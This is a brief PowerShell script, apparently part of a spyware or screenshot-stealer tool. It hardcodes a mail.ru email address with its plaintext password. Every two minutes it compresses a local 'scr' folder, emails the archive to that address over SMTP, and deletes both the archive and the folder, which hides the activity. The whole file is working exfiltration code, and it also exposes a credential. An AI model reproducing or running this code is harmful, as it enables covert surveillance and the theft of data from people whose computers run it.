# Custom
$global:scr_email = "blabla.97@internet.ru"
$global:scr_emailp = "RnvPsWFwUcrSKVnRnsU2"
$global:scr_emailp = ConvertTo-SecureString $global:scr_emailp -AsPlainText -Force
$global:scr_email_att = "$PSScriptRoot\scr"

while($true) {

  Start-Sleep -Seconds 120
  Compress-Archive -Path $global:scr_email_att -DestinationPath "$PSScriptRoot\scr.zip" -Force
  Send-MailMessage -From $global:scr_email -To $global:scr_email -Subject "scr" -Attachment "$PSScriptRoot\scr.zip" -SmtpServer "smtp.mail.ru" -Port 587 -UseSsl -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList $global:scr_email, $global:scr_emailp)
  Remove-Item $PSScriptRoot\scr.zip
  Remove-Item -Path $global:scr_email_att -Recurse -Confirm:$false

}
